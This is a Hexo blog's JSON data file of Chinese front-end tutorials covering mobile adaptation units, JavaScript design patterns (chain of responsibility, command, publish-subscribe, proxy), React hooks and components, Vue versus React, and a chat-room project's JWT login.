{"meta":{"title":"小柒","subtitle":"www.xiaoqi.cn","description":"欢迎来到我的世界!","author":"小柒","url":"https://coloey.github.io","root":"/"},"pages":[{"title":"categories","date":"2021-11-12T10:10:34.000Z","updated":"2021-11-12T10:12:26.795Z","comments":true,"path":"categories/index.html","permalink":"https://coloey.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-08-25T02:52:51.000Z","updated":"2022-08-25T02:57:27.059Z","comments":true,"path":"tags/index.html","permalink":"https://coloey.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"移动端适配","slug":"移动端适配","date":"2022-08-30T01:27:34.000Z","updated":"2022-08-30T02:51:55.626Z","comments":true,"path":"2022/08/30/移动端适配/","link":"","permalink":"https://coloey.github.io/2022/08/30/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D/","excerpt":"","text":"前置知识屏幕尺寸：以屏幕对角线的长度计算，单位是英寸 像素 pixel:显示屏画面上表示出来的最小单位 屏幕分辨率：一个屏幕具体由多少个像素点组成，单位是px 物理像素：在同一个设备上，他的物理像素是固定的，也就是厂家在生产显示设备时就决定的实际点的个数，对于不同设备物理像素点的大小是不一样的 逻辑像素（设备独立像素）：（与设备无关的逻辑像素，代表可以通过程序控制使用的虚拟像素） 设备像素比dpr:计算公式为：DPR = 物理像素/逻辑像素 当设备像素比为1:1时，使用1（1×1）个设备像素显示1个CSS像素； 当设备像素比为2:1时，使用4（2×2）个设备像素显示1个CSS像素； 当设备像素比为3:1时，使用9（3×3）个设备像素显示1个CSS像素。 视口viewport: viewport指的是视口，它是浏览器或者app中webview显示页面的区域，一般，PC端的视口指的是浏览器窗口区域，而移动端有三个视口： layout viewport:布局视口 visual viewport:视觉视口 ideal viewport:理想视口 布局视口(layout viewport): 由浏览器提出的一种虚拟的布局视口，用来解决页面在收上显示的问题，这种视口可以通过标签设置viewport来改变，移动设备上的浏览器会把自己默认的viewport设为980px或者1024px，也可能是其它值，这个是由设备自己决定的），但带来的后果就是浏览器会出现横向滚动条，因为浏览器可视区域的宽度是比这个默认的viewport的宽度要小的。 我们可以通过document.documentElement.clientWidth来获取布局视口大小 视觉视口（visual viewport） 它指的是浏览器的可视区域，也就是我们在移动端设备上能够看到的区域。默认与当前浏览器窗口大小相等，当用户对浏览器进行缩放时，不会改变布局视口的大小，但会改变视觉窗口的大小。 meta viewport 对于移动端页面，可以采用&lt;meta&gt;标签来配置视口大小和缩放等。 12&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no&quot; /&gt;复制代码 width：该属性被用来控制视窗的宽度，可以将width设置为320这样确切的像素数，也可以设为device-width这样的关键字，表示设备的实际宽度，一般为了自适应布局，普遍的做法是将width设置为device-width。 height：该属性被用来控制视窗的高度，可以将height设置为640这样确切的像素数，也可以设为device-height这样的关键字，表示设备的实际高度，一般不会设置视窗的高度，这样内容超出的话采用滚动方式浏览。 initial-scale：该属性用于指定页面的初始缩放比例，可以配置0.0～10的数字，initial-scale=1表示不进行缩放，视窗刚好等于理想视窗，当大于1时表示将视窗进行放大，小于1时表示缩小。这里只表示初始视窗缩放值，用户也可以自己进行缩放，例如双指拖动手势缩放或者双击手势放大。安卓设备上的initial-scale默认值： 无默认值，一定要设置，这个属性才会起作用。在iphone和ipad上，无论你给viewport设的宽的是多少，如果没有指定默认的缩放值，则iphone和ipad会自动计算这个缩放值，以达到当前页面不会出现横向滚动条(或者说viewport的宽度就是屏幕的宽度)的目的。 maximum-scale：该属性表示用户能够手动放大的最大比例，可以配置0.0～10的数字。 minimum-scale：该属性类似maximum-scale，用来指定页面缩小的最小比例。通常情况下，不会定义该属性的值，页面太小将难以浏览。 user-scalable：该属性表示是否允许用户手动进行缩放，可配置no或者yes。当配置成no时，用户将不能通过手势操作的方式对页面进行缩放。 这里需要注意的是viewport只对移动端浏览器有效，对PC端浏览器是无效的。 rem适配：是CSS3新增的一个相对单位，是指相对于根元素的字体大小的单位。 将屏幕宽度分为10份，设置html的font-size为window.innerWidth/10px 1rem=window.innerWidth/10px 根据UI的px计算相应rem:比如盒子宽320px，（320px/window.innerWidth)*10=5.333rem 将rem转为不同的px尺寸在不同手机上呈现：5.333rem*window.innerWidth/10px 12345//给html标签添加font-sizedocument.addEventListener(&#x27;DOMContentLoaded&#x27;, function(e) &#123; document.getElementsByTagName(&#x27;html&#x27;)[0].style.fontSize = window.innerWidth / 10 + &#x27;px&#x27;;&#125;, false); 使用Sass定义一个ps2rem函数 1234567@funtion px2rem($px)&#123; $rem: 75px;//750/10 @return ($px/$rem)+rem&#125;.box1 &#123; width: px2rem(320px);//(320/750)*10=4.266rem&#125; vw,vh适配：vw（Viewport Width）、vh(Viewport Height)是基于视图窗口的单位，是css3中提出来的，基于视图窗口的单位。 vh、vw方案即将视觉视口宽度 window.innerWidth和视觉视口高度 window.innerHeight 等分为 100 份。 上面的flexible方案就是模仿这种方案，因为早些时候vw还没有得到很好的兼容。 vw(Viewport&#39;s width)：1vw等于视觉视口的1% vh(Viewport&#39;s height) :1vh 为视觉视口高度的1% vmin : vw 和 vh 中的较小值 vmax : 选取 vw 和 vh 中的较大值 如果按视觉视口为375px，那么1vw = 3.75px，这时UI给定一个元素的宽为75px（设备独立像素），我们只需要将它设置为75 / 3.75 = 20vw 12@device-width: 375@vw: (100vw/device-width) 123456789101112131415161718192021222324252627282930313233343536373839&lt;template&gt; &lt;div class=&quot;songyao&quot;&gt; &lt;h1&gt;&#123;&#123; username &#125;&#125;&lt;/h1&gt; &lt;p&gt; 了解脚手架及脚手架指令请移步个人博客&lt;br&gt; check out the &lt;a href=&quot;http://47.100.126.169/zmengBlog&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;逐梦博客&lt;/a&gt;. &lt;/p&gt; &lt;p&gt;微信公众号：&lt;span class=&quot;wx_name&quot;&gt;前端南玖&lt;/span&gt;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &#x27;songyao&#x27;, data() &#123; return &#123; username: &#x27;songyao-cli(vue 模板)&#x27; &#125; &#125;,&#125;&lt;/script&gt;&lt;style lang=&quot;less&quot;&gt;.songyao&#123; h1&#123; font-size: 24*@vw; &#125; p&#123; font-size: 16*@vw; &#125; .wx_name&#123; color:brown; &#125;&#125;&lt;/style&gt; viewport和px这种方案可以让我们在开发时不用关注设备屏幕尺寸的差异，直接按照设计稿上的标注进行开发，也无需单位的换算，直接用px。HTML 的 head 标签里加入 &lt;meta name=&quot;viewport&quot; content=&quot;width=&#123;设计稿宽度&#125;, initial-scale=&#123;屏幕逻辑像素宽度/设计稿宽度&#125;&quot; &gt; 。 假如UI给我们提供的设计稿宽度时375px，我们则需要将页面的viewport的width设为375，然后再根据设备的逻辑像素将页面进行整体放缩。 123456789101112131415export function initViewport() &#123; const width = 375; // 设计稿宽度 const scale = window.innerWidth / width // console.log(&#x27;scale&#x27;, scale) let meta = document.querySelector(&#x27;meta[name=viewport]&#x27;) let content = `width=$&#123;width&#125;, init-scale=$&#123;scale&#125;, user-scalable=no` if(!meta) &#123; meta = document.createElement(&#x27;meta&#x27;) meta.setAttribute(&#x27;name&#x27;, &#x27;viewport&#x27;) document.head.appendChild(meta) &#125; meta.setAttribute(&#x27;content&#x27;, content)&#125; 总结：rem: 适配原理复杂 需要使用js 设计稿标注px换算到css的rem计算简单 方案灵活，即能实现整体缩放，又能实现局部不缩放 vw: 适配原理简单 不需要使用js 设计稿标注的px换算为css的vw计算复杂 viewport+px: 适配原理简单 需要使用js 直接使用设计稿标注无需换算 方案死板，只能实现页面级别肢体缩放 参考：https://juejin.cn/post/7085931616136069156#heading-19 https://juejin.cn/post/6844903590968950797#heading-7","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"职责链模式","slug":"职责链模式","date":"2022-08-27T15:41:31.000Z","updated":"2022-08-27T15:50:29.658Z","comments":true,"path":"2022/08/27/职责链模式/","link":"","permalink":"https://coloey.github.io/2022/08/27/%E8%81%8C%E8%B4%A3%E9%93%BE%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"职责链模式：使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间得到耦合关系，将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止 灵活可拆分的职责链结点123456789101112131415161718192021222324252627282930313233343536373839404142434445let order500 = function(orderType,pay,stock)&#123; if(orderType === 1 &amp;&amp; pay===true)&#123; console.log(&#x27;500元定金，100元优惠&#x27;) &#125;else&#123; return &#x27;nextSuccessor&#x27; &#125; &#125; let order200 = function(orderType,pay,stock)&#123; if(orderType === 2 &amp;&amp; pay === true)&#123; console.log(&#x27;200元定金，50元优惠&#x27;) &#125;else&#123; return &#x27;nextSuccessor&#x27; &#125; &#125; let orderNormal = function(orderType,pay,stock)&#123; if(stock&gt;0)&#123; console.log(&#x27;普通购买，无优惠&#x27;) &#125;else&#123; console.log(&#x27;库存不足&#x27;) &#125; &#125; let Chain = function(fn)&#123; this.fn = fn; this.successor = null &#125; Chain.prototype.setNextSuccessor = function(successor)&#123; return this.successor = successor &#125; Chain.prototype.passResquest = function()&#123; let ret = this.fn.apply(this,arguments) //console.log(ret) if(ret === &#x27;nextSuccessor&#x27;)&#123; return this.successor &amp;&amp; this.successor.passResquest.apply(this.successor,arguments) &#125; return ret &#125; let chainOrder500 = new Chain(order500)//500元定金，100元优惠 let chainOrder200 = new Chain(order200) let chainOrderNormal = new Chain(orderNormal) chainOrder500.setNextSuccessor(chainOrder200) chainOrder200.setNextSuccessor(chainOrderNormal) chainOrder500.passResquest(1,true,500)//500元定金，100元优惠 chainOrder500.passResquest(2,true,500)//走nextSuccessor,200元定金，50元优惠 chainOrder500.passResquest(3,true,500)//继续nextSuccessor,普通购买，无优惠 chainOrder500.passResquest(1,false,0)//一直nextSuccessor到库存不足 当要加入一个结点： 123456let order300 = function()&#123; ...&#125;chainOrder300 = new Chain(order300)chainOrder500.setNextSuccessor(chainOrder300)chainOrder300.setNextSuccessor(chainOrder200) AOP模式实现职责链：1234567891011121314151617181920212223242526272829303132333435let order500 = function(orderType,pay,stock)&#123; if(orderType === 1 &amp;&amp; pay===true)&#123; console.log(&#x27;500元定金，100元优惠&#x27;) &#125;else&#123; return &#x27;nextSuccessor&#x27; &#125; &#125; let order200 = function(orderType,pay,stock)&#123; if(orderType === 2 &amp;&amp; pay === true)&#123; console.log(&#x27;200元定金，50元优惠&#x27;) &#125;else&#123; return &#x27;nextSuccessor&#x27; &#125; &#125; let orderNormal = function(orderType,pay,stock)&#123; if(stock&gt;0)&#123; console.log(&#x27;普通购买，无优惠&#x27;) &#125;else&#123; console.log(&#x27;库存不足&#x27;) &#125; &#125;Function.prototype.after = function(fn)&#123; let self = this return function()&#123; let ret = self.apply(this,arguments) if(ret === &#x27;nextSuccessor&#x27;)&#123; return fn.apply(this,arguments) &#125; return ret; &#125; &#125; let order = order500.after(order200).after(orderNormal) order(1,true,500) order(2,true,500) order(1,false,500)","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"命令模式","slug":"命令模式","date":"2022-08-26T07:12:38.000Z","updated":"2022-08-26T08:29:23.877Z","comments":true,"path":"2022/08/26/命令模式/","link":"","permalink":"https://coloey.github.io/2022/08/26/%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"命令模式的应用场景：有时候向某些对象发送请求，但是不知道请求接收者和发送者是谁，也不知请求操作是什么，此时用一种松耦合的方式来设计程序，使得发送者和接收者能够消除耦合关系 面向对象形式：1234567891011121314151617181920212223242526272829&lt;body&gt; &lt;button id=&quot;button1&quot;&gt;点击按钮1&lt;/button&gt; &lt;script&gt; let btn1 = document.getElementById(&#x27;button1&#x27;) //安装命令的函数 let setCommand = function(button,command)&#123; button.onclick = function()&#123; command.execute() &#125; &#125; //命令接收者 let MenuBar = &#123; refresh :function()&#123; console.log(&quot;刷新菜单目录&quot;) &#125; &#125; //command对象 let RefreshMenuBarCommand = function(receiver)&#123; this.receiver=receiver &#125; RefreshMenuBarCommand.prototype.execute = function()&#123; this.receiver.refresh() &#125; //命令接收者接传入到command对象，把command对象安装到button上 let refreshMenuBarCommand = new RefreshMenuBarCommand(MenuBar) setCommand(button1,refreshMenuBarCommand) &lt;/script&gt;&lt;/body&gt; 闭包形式可以使用闭包的命令模式，将命令接收者封闭在闭包产生的环境中，执行命令的操作更简单，仅仅是执行回调函数 12345678910111213141516171819202122let btn1 = document.getElementById(&#x27;button1&#x27;) //安装命令的函数 let setCommand = function(button,command)&#123; button.onclick = function()&#123; command.execute() &#125; &#125; //命令接收者 let MenuBar = &#123; refresh :function()&#123; console.log(&quot;刷新菜单目录&quot;) &#125; &#125; //command对象 let RefreshMenuBarCommand = function(receiver)&#123; return function()&#123; return receiver.refresh() &#125; &#125; //命令接收者传入到command对象，把command对象安装到button上 let refreshMenuBarCommand = new RefreshMenuBarCommand(MenuBar) setCommand(button1,refreshMenuBarCommand) 使用命令模式可以方便给对象增加撤销命令操作，撤销命令是执行命令的反向操作,文本编辑器的Ctrl+Z和围棋中的悔棋都是撤销命令 12345678910111213141516171819202122232425262728293031323334&lt;body&gt; &lt;div id=&quot;ball&quot; style=&quot;position: absolute;background: #000;width:50px;height:50px&quot;&gt;&lt;/div&gt; &lt;input type=&quot;text&quot; id=&quot;pos&quot;&gt; &lt;button id=&quot;moveBtn&quot;&gt;开始移动&lt;/button&gt; &lt;button id=&quot;cancleBtn&quot;&gt;撤销命令&lt;/button&gt; &lt;script&gt; let ball = document.getElementById(&#x27;ball&#x27;) let pos = document.getElementById(&#x27;pos&#x27;) let moveBtn = document.getElementById(&#x27;moveBtn&#x27;) let cancleBtn = document.getElementById(&#x27;cancleBtn&#x27;) let moveCommand; let MoveCommand = function (receiver,pos) &#123; this.receiver = receiver; this.pos = pos; this.oldPos=null &#125; MoveCommand.prototype.excute = function()&#123; this.receiver.start(&#x27;left&#x27;,this.pos,1000,&#x27;strongEaseout&#x27;) oldPos = this.receiver.dom.getBoundingClientRec()[this.receiver.propertyName] &#125; //执行反向操作 MoveCommand.prototype.undo = function()&#123; this.receiver.start(&#x27;left&#x27;,this.oldPos,1000,&#x27;strongEaseout&#x27;) &#125; moveBtn.onclick=function()&#123; let animate = new Animate(ball) moveCommand = new MoveCommand(animate,pos.value) moveCommand.excute() &#125; cancleBtn.onclick=function()&#123; moveCommand.undo() &#125; &lt;/script&gt;&lt;/body&gt; 宏命令是一组命令的集合，通过执行宏命令可以执行一批命令 1234567891011121314151617181920212223242526272829let quitCommand = &#123; execute: function()&#123; console.log(&#x27;退出&#x27;) &#125;&#125;let loginCommand =&#123; execute: function()&#123; console.log(&#x27;登录&#x27;) &#125;&#125;let MacroCommand = function()&#123; return &#123; commandList:[], add: function(command)&#123; this.commandList.push(command) &#125;, execute:function()&#123; for(let i=0;command;command = this.commandList[i])&#123; command.execute() &#125; &#125; &#125;&#125;let macroCommand = new MacroCommand()macroCommand.add(quitCommand)macroCommand.add(loginCommand)macroCommand.execute() 总结一般，命令模式都会在command命令对象中保存一个接收者负责真正执行客户的请求，这种命令模式是傻瓜式命令，它只负责把客户的命令转发给接收者执行，让请求发起者和接收者之间尽可能解耦 聪明式命令对象可以直接实现请求，不需要接收者的存在，形式上和策略模式很像，通过使用意图分辨它们，策略模式指向的问题域更小，所有策略目标一致，它们只是达到这个目标的不同手段，命令模式指向的问题域更广，command对象解决的目标更具发散性。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"函数式组件与类组件的不同","slug":"函数式组件与类组件的不同","date":"2022-08-24T15:37:14.000Z","updated":"2022-08-24T15:51:20.244Z","comments":true,"path":"2022/08/24/函数式组件与类组件的不同/","link":"","permalink":"https://coloey.github.io/2022/08/24/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BB%84%E4%BB%B6%E4%B8%8E%E7%B1%BB%E7%BB%84%E4%BB%B6%E7%9A%84%E4%B8%8D%E5%90%8C/","excerpt":"","text":"eg:类组件：12345678910111213class ProfilePage extends React.Component &#123; showMessage = () =&gt; &#123; alert(&#x27;Followed &#x27; + this.props.user); &#125;; handleClick = () =&gt; &#123; setTimeout(this.showMessage, 3000); &#125;; render() &#123; return &lt;button onClick=&#123;this.handleClick&#125;&gt;Follow&lt;/button&gt;; &#125;&#125; 函数式组件：12345678910111213function ProfilePage(props) &#123; const showMessage = () =&gt; &#123; alert(&#x27;Followed &#x27; + props.user); &#125;; const handleClick = () =&gt; &#123; setTimeout(showMessage, 3000); &#125;; return ( &lt;button onClick=&#123;handleClick&#125;&gt;Follow&lt;/button&gt; );&#125; 在React中props是不可变的，所以它们永远不会改变，然而,类组件中，this是且永远是可变的 类组件中this存在的意义：React本身随着时间推移而改变，以便你可以在渲染方法以及生命周期方法中得到最新的实例. 如果希望类组件中能在一次特定渲染中捕获那一次渲染所用的props或者state，可以使用闭包 123456789101112131415161718class ProfilePage extends React.Component &#123; render() &#123; // Capture the props! const props = this.props; // Note: we are *inside render*. // These aren&#x27;t class methods. const showMessage = () =&gt; &#123; alert(&#x27;Followed &#x27; + props.user); &#125;; const handleClick = () =&gt; &#123; setTimeout(showMessage, 3000); &#125;; return &lt;button onClick=&#123;handleClick&#125;&gt;Follow&lt;/button&gt;; &#125;&#125; 函数式组件想捕获最新的props和state?用useRef 123456789101112function MessageThread() &#123; const [message, setMessage] = useState(&#x27;&#x27;); // 保持追踪最新的值。 const latestMessage = useRef(&#x27;&#x27;); useEffect(() =&gt; &#123; latestMessage.current = message; &#125;); const showMessage = () =&gt; &#123; alert(&#x27;You said: &#x27; + latestMessage.current); &#125;; 总结于：","categories":[{"name":"React","slug":"React","permalink":"https://coloey.github.io/categories/React/"}],"tags":[]},{"title":"详解useEffect","slug":"详解useEffect","date":"2022-08-24T07:06:04.000Z","updated":"2022-08-24T15:36:42.558Z","comments":true,"path":"2022/08/24/详解useEffect/","link":"","permalink":"https://coloey.github.io/2022/08/24/%E8%AF%A6%E8%A7%A3useEffect/","excerpt":"","text":"每次渲染都有它自己的Effectscount是某个特定渲染中的常量。事件处理函数“看到”的是属于它那次特定渲染中的count状态值。对于effects也同样如此： 并不是count的值在“不变”的effect中发生了改变，而是effect 函数本身在每一次渲染中都不相同,概念上它是组件输出的一部分，可以看到属于某次特定渲染的props和state Effects的清除effects有时候需要有一个清理步骤，目的是消除副作用，React只会在浏览器绘制后运行effects，这使得你的应用更流畅，因为大多数effects不会阻塞屏幕的更新，effects的清除同样被延迟，上一次的effect会在重新渲染后被清除 React 渲染&#123;id: 20&#125;的UI。 浏览器绘制。我们在屏幕上看到&#123;id: 20&#125;的UI。 React 清除&#123;id: 10&#125;的effect。 React 运行&#123;id: 20&#125;的effect。 effect的清除不会读取最新的props，它只能读取到定义它的那次渲染中华的prop值 告诉React去比对你的Effects这是为什么你如果想要避免effects不必要的重复调用，你可以提供给useEffect一个依赖数组参数(deps)： 123useEffect(() =&gt; &#123; document.title = &#x27;Hello, &#x27; + name;&#125;, [name]); // Our deps 这好比你告诉React：“Hey，我知道你看不到这个函数里的东西，但我可以保证只使用了渲染中的name，别无其他。” 移除依赖 123456useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(count + 1); &#125;, 1000); return () =&gt; clearInterval(id); &#125;, [count]); 定时器会在每一次count改变后清除和重新设定 123456useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(c =&gt; c + 1); &#125;, 1000); return () =&gt; clearInterval(id); &#125;, []); React已经知道当前的count,我们需要告知React的仅仅是去递增状态，不管它现在具体是什么值 解耦来自Actions的更新 当你写setSomething(something=&gt;…)这种代码时可以考虑使用reducer,reducer可以让你把组件内发生了什么和状态如何响应并更新分开描述 我们用一个dispatch依赖去替换effect的step依赖 123456789const [state, dispatch] = useReducer(reducer, initialState);const &#123; count, step &#125; = state;useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; dispatch(&#123; type: &#x27;tick&#x27; &#125;); // Instead of setCount(c =&gt; c + step); &#125;, 1000); return () =&gt; clearInterval(id);&#125;, [dispatch]); 123456789101112131415const initialState = &#123; count: 0, step: 1,&#125;;function reducer(state, action) &#123; const &#123; count, step &#125; = state; if (action.type === &#x27;tick&#x27;) &#123; return &#123; count: count + step, step &#125;; &#125; else if (action.type === &#x27;step&#x27;) &#123; return &#123; count, step: action.step &#125;; &#125; else &#123; throw new Error(); &#125;&#125; React保证dispatch在每次渲染中都是一样的，所以可以在依赖中去掉它，不会引起effect不必要的重复执行，当dispatch时，React只记住了action,它会在下一次渲染中再次调用reducer 无限重复请求问题：1 没有依赖数组，那么每次渲染都会触发这个副作用 123useEffect(()=&gt;&#123; fetchData()&#125;) 2 设置了依赖数组，但是依赖数组里的变量一直在变 12345678910const [data,setData] = useState()useEffect(()=&gt;&#123; const fetchData = async() =&gt; &#123; const res = await fetchNewData() setData(res.data) &#125; fetchData()&#125;,[data]) 定义函数请求 某些函数只在effect中使用，那就在effect中定义 某些函数在多个地方使用，就独立定义，最好用useCallBack包裹，并且在依赖数组里把依赖项写全 eg: 123456789101112131415function SearchResults() &#123; const [query, setQuery] = useState(&#x27;react&#x27;); // ✅ Preserves identity until query changes const getFetchUrl = useCallback(() =&gt; &#123; return &#x27;https://hn.algolia.com/api/v1/search?query=&#x27; + query; &#125;, [query]); // ✅ Callback deps are OK useEffect(() =&gt; &#123; const url = getFetchUrl(); // ... Fetch data and do something ... &#125;, [getFetchUrl]); // ✅ Effect deps are OK // ...&#125; 如果query不变，getFetchUrl也会保持不变，effect也不会重新运行，反之，query改变了，getFetchUrl也会随之改变 参考：","categories":[{"name":"React","slug":"React","permalink":"https://coloey.github.io/categories/React/"}],"tags":[]},{"title":"发布订阅模式","slug":"发布订阅模式","date":"2022-08-24T03:58:59.000Z","updated":"2022-08-24T04:09:26.542Z","comments":true,"path":"2022/08/24/发布订阅模式/","link":"","permalink":"https://coloey.github.io/2022/08/24/%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"发布订阅模式的实现：123456789101112131415161718192021222324252627282930313233343536373839404142434445class EventEmitter &#123; constructor()&#123; this.events=&#123;&#125;; &#125; on(type,handler)&#123; if(!this.events[type])&#123; this.events[type]=[] &#125; this.events[type].push(handler) &#125; addListener(type,handler)&#123; this.on(type,handler) &#125; prependListener(type,handler)&#123; if(!this.events[type])&#123; this.events[type]=[] &#125; this.events[type].unshift(handler) &#125; removeListener(type,handler)&#123; if(!this.events[type])&#123; return; &#125; this.events[type]=this.events[type].filter(item=&gt;item !== handler) &#125; off(type,handler)&#123; this.removeListener(type,handler) &#125; emit(type,...args)&#123; if(!events[type]||events[type].length==0)&#123; return; &#125; this.events[type].forEach(item=&gt;&#123; Reflect.apply(item,this,args); &#125;) &#125; once(type,handler)&#123; function temp(...args)&#123; handler(args) this.off(type,handler) &#125; this.on(type,temp)//为事件注册单次监听器 &#125;&#125; 优点： 时间解耦 对象之间解耦 应用上：可以用在异步编程 架构上：MVC和MVVM都有发布订阅模式的参与，JavaScript本身是一门基于事件驱动的语言 缺点：创建订阅者本身需要消耗一定的时间和内存，而且当你订阅一个消息后，如果该消息最后都未发生，那么这个订阅者会始终存储在内存中。另外，发布订阅模式虽然会弱化对向之间的联系，但是过度使用，，对象和对象之间的必要联系会被深埋在背后，导致程序难以维护和理解","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"代理模式","slug":"代理模式","date":"2022-08-23T03:25:07.000Z","updated":"2022-08-23T05:18:02.344Z","comments":true,"path":"2022/08/23/代理模式/","link":"","permalink":"https://coloey.github.io/2022/08/23/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"虚拟代理虚拟代理会把一些开销很大的对象，延迟到真正需要它的时候再执行 虚拟代理实现图片预加载代理负责预加载图片，预加载操作完成后将请求重新交给本体MyImage，降低耦合度 123456789101112131415161718let myImage=(function()&#123; let ImageNode = document.createElement(&#x27;img&#x27;) document.body.appendChild(ImageNode) return function(src)&#123; ImageNode.src = src &#125;&#125;)()let proxyImage = (function()&#123; let img = new Image img.onload=function()&#123; myImage(this.src) &#125; return function()&#123; myImage(&#x27;file://C:/Users/sevenaeng/Desktop/loading.jpg&#x27;) img.src=src &#125;&#125;)()proxyImage(&#x27;http://imgcache.qq.com/music/a.jpg&#x27;) 虚拟代理合并https请求123456789101112131415161718192021222324252627//虚拟代理合并http请求let synchronusFile = function(id)&#123; console.log(&#x27;开始同步文件,id为:&#x27;+id)&#125;let proxySynchronousFile=(function()&#123; let cache = [],timer; return function()&#123; cache.push(id) if(timer)&#123; return; &#125; timer=setTimeout(function()&#123; synchronusFile(cache.join(&#x27;,&#x27;))//两秒内向本体发送需要同步的ID集合 clearTimeout(timer) timer=null cache.length=0//清空ID集合 &#125;,2000) &#125;&#125;)()let checkbox = document.getElementsByTagName(&#x27;input&#x27;)for(let i=0;c;c=checkbox[i++])&#123; c.onclick=function()&#123; if(this.checked === true)&#123; proxySynchronousFile(this.id) &#125; &#125;&#125; 缓存代理：1234567891011121314151617181920//缓存代理计算乘积let mult =function()&#123; let a = 1 for(let i=0;i&lt;arguments.length;i++)&#123; a= a*arguments[i] &#125; return a&#125;//缓存代理工厂let createProxyFactory=function(fn)&#123; let cache=&#123;&#125; return function()&#123; let args = Array.prototype.join.call(arguments,&#x27;,&#x27;) if(args in cache)&#123; return cache[args] &#125; return cache[args]=fn.apply(this,arguments) &#125;&#125;let proxyMult = createProxyFactory(mult) 代理的意义： 实现单一职责原则，指的是一个类，应该仅有一个引起它变化的原因，如果一个对象承担了多个职责，这个对象将会变得巨大，引起它变化的原因也会很多，这些耦合在一起会导致脆弱和低内聚的设计","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"vue和react的区别","slug":"vue和react的区别","date":"2022-08-20T10:07:13.000Z","updated":"2022-08-20T10:24:31.037Z","comments":true,"path":"2022/08/20/vue和react的区别/","link":"","permalink":"https://coloey.github.io/2022/08/20/vue%E5%92%8Creact%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"Vue和React的相同点很多：都使用Virtual DOM 都使用组件化的思想 都是响应式，使用MVVM模式 都有自己的构建工具，Vue的vue-cli,React的create-react-app 区别：数据流向不同react从诞生开始就推崇单向数据流，而Vue是双向数据流 Vue基于template模板+Option API/Compnent API,React本质核心只有一个Virtual DOM+Diff算法，Api非常少 响应式原理不同：Vue依赖收集，自动优化，数据可变 Vue递归监听data的所有属性，直接修改 当数据改变时，自动找到引用组件重新渲染 React: React基于状态机，手动优化，数据不可变，需要setState驱动新的State替换旧的State 当数据改变时，以组件为根目录，默认全部重新渲染 diff算法不同：两者思维相似，都是基于两个假设： 不同的组件产生不同的DOM结构，当type不同时，对应DOM操作就是直接销毁老的DOM，创建新的DOM 同一层次的一组子节点，可以通过唯一的key区分 源码实现上有区分： Vue Diff使用双向指针，边对比边更新DOM React主要使用diff队列保存需要更新的DOM，得到patch树，再统一操作批量更新DOM 事件机制不同Vue Vue原生事件使用标准Web事件 Vue组件自定义事件机制，是父子组件通信基础 Vue合理利用了snabbdom库的模块插件 React React原生事件被包装，所有事件都冒泡到顶层document监听，然后在这里合成事件下发。基于这套，可以跨端使用事件机制，而不是和Web DOM强绑定。 React组件上无事件，父子组件通信使用props","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"基于聊天室项目的总结","slug":"基于聊天室项目的总结","date":"2022-08-15T12:39:18.000Z","updated":"2022-08-22T16:01:18.757Z","comments":true,"path":"2022/08/15/基于聊天室项目的总结/","link":"","permalink":"https://coloey.github.io/2022/08/15/%E5%9F%BA%E4%BA%8E%E8%81%8A%E5%A4%A9%E5%AE%A4%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%80%BB%E7%BB%93/","excerpt":"","text":"用node中的express搭建服务器,写接口，登录方式采用jwt登录验证，用mysql存储各个人员信息,用soket.io实现聊天功能，webpack打包项目，以及动态展示功能,支持修改密码，注册用户，一对一实时聊天，发表情包,图片等功能，各个页面之间的跳转用vue-router实现，跳转使用路由懒加载，只会在第一次进入页面时才会获取这个函数，然后使用缓存数据。搭配使用Weui样式库。 jwt登录认证的实现：jwt组成部分： 头部.有效荷载.签名 Header.PayLoad.Signature 头部：包含了JWT类型和使用的Hash算法 负载：包含了一些声明，通常是一个User信息 签名：是对前两部分的签名，防止数据篡改 原理： 当用户使用凭据成功登录后，将返回一个json web token,由于token是凭据，不应该将token保留超过所需要的时间，也不应该将敏感数据存储在浏览器存储中，token在Authotization标头中放，跨域资源共享不会成为问题，因为它不使用cookie,使用jwt认证，程序可以使用access token去访问受保护的资源，比如在express中的使用，可以 12345//以/api/开头的不用权限，配置成功了express-jwt这个中间件，就可以把解析出来的用户信息挂载到req.user上app.use(expressJWT(&#123; secret:secretkey, algorithms: [&#x27;HS256&#x27;], &#125;).unless(&#123;path:[/^\\/api\\//]&#125;)) JWT优点：不需要在服务端保存会话信息，所以易于应用的扩展，即信息不保存在服务端，不会存在Session扩展不方便的情况 